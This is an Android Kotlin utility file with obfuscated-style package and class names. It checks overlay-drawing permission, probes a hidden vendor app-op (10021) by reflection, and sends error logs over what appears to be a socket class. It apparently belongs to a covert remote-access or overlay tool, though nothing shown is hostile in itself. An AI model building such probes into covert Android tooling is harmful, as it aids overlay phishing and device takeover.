package com.xxx.zzz.globp.utilssss

import android.app.Activity
import android.app.AppOpsManager
import android.content.Context
import android.graphics.PixelFormat
import android.os.Binder
import android.os.Build
import android.os.Process
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import com.xxx.zzz.socketsp.IOSocketyt
import java.lang.reflect.Method

object MiuUtils {

    fun canDrawOverlays(context: Context): Boolean {
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.M && Settings.canDrawOverlays(context)) return true
        val manager = context.applicationContext.getSystemService(Activity.APP_OPS_SERVICE) as AppOpsManager?
        if (manager != null) {
            runCatching {
                val result = manager.checkOp(
                    AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW,
                    Binder.getCallingUid(),
                    context.packageName
                )
                return result == AppOpsManager.MODE_ALLOWED
            }.onFailure {
                IOSocketyt.sendLogs("", "canDrawOverlays ${it.localizedMessage}", "error")
            }
        }
        runCatching {
            val mgr = context.applicationContext.getSystemService(Activity.WINDOW_SERVICE) as WindowManager
            val viewToAdd = View(context)
            val params = WindowManager.LayoutParams(
                0,
                0,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSPARENT
            )
            viewToAdd.layoutParams = params
            mgr.addView(viewToAdd, params)
            mgr.removeView(viewToAdd)
            return true
        }.onFailure {
            IOSocketyt.sendLogs("", "canDrawOverlays2 ${it.localizedMessage}", "error")
        }
        return false
    }

    fun isAllowed(context: Context): Boolean {
        val ops = context.applicationContext.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        runCatching {
            val op = 10021
            val method: Method = ops.javaClass.getMethod(
                "checkOpNoThrow",
                Int::class.javaPrimitiveType,
                Int::class.javaPrimitiveType,
                String::class.java
            )
            return method.invoke(
                ops,
                op,
                Process.myUid(),
                context.packageName
            ) == AppOpsManager.MODE_ALLOWED
        }.onFailure {
            IOSocketyt.sendLogs("", "isAllowed ${it.localizedMessage}", "error")
        }
        return false
    }

}